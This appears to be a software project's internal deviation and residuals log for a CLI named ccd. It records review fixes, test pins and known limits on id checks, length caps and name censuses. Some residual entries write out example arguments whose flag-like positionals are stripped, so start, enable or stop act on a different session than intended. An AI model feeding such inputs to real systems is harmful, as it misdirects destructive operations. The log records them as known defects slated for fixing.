  - the nine precision fixes of Task 12's fix round (`d7bcf55d2`), each checked against the tip: spec §2.9's "Apart from the dot rule" also names the collector's pre-lock pass; its SEC7 text no longer says "with nothing journaled" (the audit leaves `registered` unjournaled, as it leaves every word that is not terminal, and the verb journals every refusal); the contract's Task 10 reason is "arity or the post-loop `_reg_id_ok` check"; `ccd-id-cap.test.ts`'s two comments cite spec §2.9 where they cited plan R-numbers (comments only); the contract's SEC5 bullet says "before any row, worktree, branch or `.uuid`"; the spec says "no ccrc peer card" where it said "no card"; the dash-free listing clause is qualified by the population; the proof paragraph adds that the pre-wave binary also acted for stop, stopPair, start, enable, ws-restore, ws-reclaim and ws-expire; and Table 1's ws-collect row drops its fixture vocabulary.
  - `w1b-as-built-prose-pins`: Task 12 creates `path-identity-w1b-prose.test.ts`, which pins the departure and residual slugs in spec §2.9 and the contract note, where the task's scope said it adds no new test file.
  - `prose-test-census-zero-overhead-row`: the prose test asserted every census overhead above zero, but the `<id>` row has overhead 0, so it asserts at least zero.
  - `prose-test-pins-the-carries`: the test's `DEPARTURES` and `BASE_RESIDUALS` lists hold the carries' slugs, and a `FOUND_WHILE_BUILDING` list with a third contract case pins the per-task bullets of the contract note.
  - `draft-claims-corrected-to-the-tip`: the code won over the brief's draft in the as-built prose: the census list is rewritten from the table (it no longer names the quarantine record, the witness or the `.d` directory); `start <id>` is not "unchecked" and `pr-state --session` is not "without a flag loop", since both keep the inline regex; item 31 says the lane acts only once the operator arms it, not that it composes it; the claim that every existing suite ran green with no assertion edited is dropped; both tables are the measured rows; stop's rows say "the order W1a composes"; and the entry-count sentence promises counts only.
  - F8: spec SEC7 step 2 said the pass answers with the locked evaluation's "word and detail byte for byte". After F3 it says that, at the audit, every answer the locked evaluation also gives carries its word and detail byte for byte (the two second-look answers, a record or a witness that reads sound only on a second look, are the pass's own, with details of their own); that the verb keeps the pass's word and detail and adds its no-lock clause after the detail of an unmeasured answer, so that the clause never pushes the detail toward the reason cap (a cut takes the clause first, and reaches the detail only when the detail alone passes the cap); and that it puts "no lock was taken: " before the detail of a refusal.
  - F9: `comments-say-ccd-scans-the-session-value` is added to spec §2.9's and the contract note's residual lists (and to the prose test's `BASE_RESIDUALS`).
  - F10: the residual `stripped-flag-positional-collapses-to-the-id-form` also names the two-token `--route <v>` arm at start and enable, which takes the next token whole as the route pair and so eats the positional that follows it (`start <existing-id> --route compact=50` restarts that row and writes the pair, unless the eaten token is no valid route pair, which the route check refuses).
  - F11: the same residual's "reachable only through an operator-typed request body" holds for start and enable. Stop's half is reached through the stop route's `stopPair`, which takes its project from the registry row, so it needs a hand-planted row whose project spells `--surface=<w>`.
  - F12, spec half: spec §2.9's SEC7 text said the pass "writes nothing"; it now says that it writes no registry, lock, journal or quarantine state, and that listing the records makes two scratch files and removes them before the pass returns.
  - F13: the census blindness, re-measured at this tip after F1, had been stated at a threshold measured on the tree before the merges of `main`; it is now stated as measured at the tip (one contiguous region from line 5818 down) under the slug `census-blind-below-line-5818`, in the contract note's R93 bullet and the prose test; spec §2.9 never stated it. The measurement is in the Task 4 entry.
  - F19: the contract note's R93 bullet records the second absorption of `main`, `65614d350`, of `main` at `c7776b080`, which was Task 13's, before the pull request opened. It brought code PRs #189, #190, #191, #403, #406 and #408, plus docs PRs, and its one conflict was the stamp line, regenerated. Fix round 1 absorbed `main` a third time, as `7bfef06cc`, of `main` at `a3cebde1b`; that brought ten PRs, code PRs #404, #411, #412, #413 (CI and tests), #417, #418 and #419, and docs PRs #342, #414 and #416, and its one conflict was `ccd/ccd`'s generated stamp line, restamped. The R93 bullet records it too (F8 of review 473, fix round 2).
  - F14 and F15, residual completeness, as the rulings reword it: `verbs-outside-sec1-keep-the-inline-regex` adds `route --session <id>` (route alone carries the server's `--actor` and `--reason`, but binds `--session` as a pair, so an id that spells one is bound literally and looked up; "none of them carries the decision flags" is narrowed to the others) and `swap <id> <wrapper>` beside `ensure <id>` (an id with no shape check, needing an existing row), and says that the inline checks, route's included and swap having none, run without `LC_ALL=C`, so under a widening locale they admit a non-ASCII id and bind it literally; neither route nor swap redirects.
  - F2 of review 473 (fix round 2): the contract note's "Found while building, per task" said Tasks 1, 5 and 8 recorded no slug beyond the departures. Task 5 found `merge-moves-a-stale-citation-under-a-rewritten-comment`, Task 9 later found `prelock-prefix-cuts-the-rc3-detail` and `archived-expiry-census-fourth-collect-failed-site`, and Task 13 found `superpowers-tracked-file-count-is-one`, so each now has its bullet there and in the prose test's `FOUND_WHILE_BUILDING`. The opening sentence names Tasks 1 and 8 only, and says that Task 12's slugs concern the record itself (the as-built prose, its prose test and its draft claims) and are defined in this entry only; the note names this entry by its task, because the note carries no deviation number.
  - F7 of review 473: `history-spool-names-outside-the-census-patterns` keeps its slug and now covers the history store's own names: the hook's `spool/<id>.jsonl`, the sweep's `.obs` sidecar, and `~/.ccrc/history/recall-off/<id>` (`recallOffPath`), a bare `/<id>` that adds no bytes beyond the id. The draining name is still the widest, so the cap is unaffected, and the history CLI's `${P.spool}/${id}.jsonl` (`writeRecallLine`) is now matched and counted under the `<id>.<field>` family with the field `jsonl`. It is reworded in both places in spec §2.9 and in the contract note; `BASE_RESIDUALS` is unchanged.
- **D-5086** (Task 13) plan-text corrections and extra pins — one:
  - `superpowers-tracked-file-count-is-one`: Task 13 Step 4 expects `git ls-files .superpowers | wc -l` to print 0 ("because the ledger is gitignored and never committed"), and 1 was measured, a file tracked on `main` since #217, which this wave's diff does not touch (the diff holds no `.superpowers` path). The plan's literal is corrected to the measured 1.

**Named, with no number: stated residuals.**
- `dot-rule-only-at-the-token-verbs`: release, archive, restore, hold, rename and stop still accept a dot-leading id. This is an operator option (R3).
- `verbs-outside-sec1-keep-the-inline-regex`: ws-attic, pr-open, plain ws-audit, ws-reap, forget and `start <id>` keep today's id check, and `ensure <id>` and `pr-state --session <id>` bind the id they are given literally. Plain ws-audit audits a dash-leading id literally (pinned by Task 10).
- `enable-one-arg-journals-an-unchecked-id`: `enable <id>` journals `_lc_done enable "$id"` before any id check, beside `start <id>`.
- `hand-planted-ids-over-the-cap`: a row planted by hand above `_REG_ID_MAX` is not refused (SEC5's residual).
- `files-outside-the-name-census`: each file Task 0 left out of the census, with its reason (`CENSUS_EXCLUDED`).
- `ids-over-128-invisible-to-the-hook-peer-census`: only if the coordinator chooses R27 (b).
- `projects-over-64-get-no-hook-card`: the hook's `CCRC_PROJ_MAX` gate, under either R27 choice.
- `btime-less-witness-takes-the-lock`: its `witness-mismatch` stays an under-lock answer (R21).
- `server-docstrings-call-ccds-predicate-dot-only`: the comments at `isTmpRootId` (`shared/api.ts`) and `childReclaimLeafKept` (`server/src/childReclaimSweep.ts`) are carried to the next wave that edits those files.
- `expire-v1-note-ships-it-inert`: workspace-lifecycle's text, reported to that programme.
- `comments-say-ccd-scans-the-session-value`: the `isTmpRootId` docstring (`shared/api.ts`) and the comment above `collect-l0.test.ts`'s dash-leading rows still say ccd's destructive verbs read their decision flags from `--session`'s value. At this wave's tip the token verbs take the pair whole, so that holds only for a box on an older ccd. Neither file is in this wave's HARD BOUNDARY; both are carried to the next wave that edits them.
- `history-spool-names-outside-the-census-patterns`: the hook's `spool/<id>.jsonl` and the sweep's `.obs` sidecar are built from a bare id or a file name that the census scanner's spellings do not match; the table holds the draining name, `<id>.<ms>.<pid>.jsonl`, and neither of the other two is wider than it.
- `quarantine-record-names-outside-the-census-patterns`: the quarantine record `tmpquarantine/<id>.<ns>.<pid>` (28 bytes) and the temp `.<id>.<ns>.<pid>.<pid>.<R>.tmp` its writer makes (47 bytes) spell the id `$name`, as does the witness writer's temp `.<id>.<pid>.<R>.tmp` (19 bytes); each is narrower than the widest row, so the cap is unaffected.
- `random-slug-decides-the-cap-near-the-boundary`: ws-add caps the id after it chooses the slug, so for a project of between 114 and 118 bytes given no slug, the random slug's length (between 9 and 14 bytes) decides whether the add succeeds or is refused.
- `hold-card-workdir-quote-silent-near-the-cap`: the hook's `CCRC_WD_MAX` is 127, one under the length its reads stop at, and the hold card quotes a workspace's directory only when the path fits it, so a worktree path past 127 characters, which an id near the cap can reach, loses the quote; the card degrades to silence, never to a false statement.
- `dash-leading-pool-tag-unclearable-on-an-upgraded-box`: on a box that already holds the pool tag of a dash-leading project, `ccd project-pool --project -lead --clear` now refuses; the entry check counted none on either box, and the doctor's text for a tag it cannot print as a command already says to remove it by hand.
- `stripped-flag-positional-collapses-to-the-id-form`: start and enable strip `--cross-pool`, `--`, `--route=<f>=<v>` and the two-token `--route <v>` (which takes the next token whole, so it also eats the positional that follows it), and stop strips `--surface` and `--surface=`, from any position before their arity rule, so a positional spelled as one of those never reaches the two-argument checks and the call collapses to the one-argument (id) form: `enable --cross-pool <existing-id>` and `enable <wrapper> --` journal `enable` against the other positional and start that existing id, `start <existing-id> --route compact=50` restarts that row and writes the pair, and `stop <wrapper> --surface=x --surface pwa` stops `<wrapper>`. Not a regression (the pre-wave binary does the same), and ccd never mints such a name; at start and enable it is reachable only through an operator-typed request body to the server's session-creation route, and stop's half needs a hand-planted row whose project spells `--surface=<w>`.
- `fastify-param-length-below-the-id-cap` (carried to the next server-side wave): Fastify's default `maxParamLength` of 100 answers 414 for `/api/sessions/:id/...` with an id of between 101 and 128 bytes, which the cap admits.
- `history-field-literals-passed-as-arguments-outside-the-field-max-scan` (carried to the next server-side wave): a field literal passed as an argument to a name template whose field is a placeholder, such as the literals the history CLI passes to `regPresence`, matches the census's `<id>.<field>` row with no length check, and FIELD_MAX is pinned to `ccd/ccd`'s literals only, so no scan reads their length. Today they are 10 bytes at most. Not a stated residual.
- the server guard on `POST /api/sessions` (carried to the next server-side wave): refuse a wrapper outside the roster and a project that fails the project rule, so that the operator-typed body behind `stripped-flag-positional-collapses-to-the-id-form` is refused before it reaches ccd.
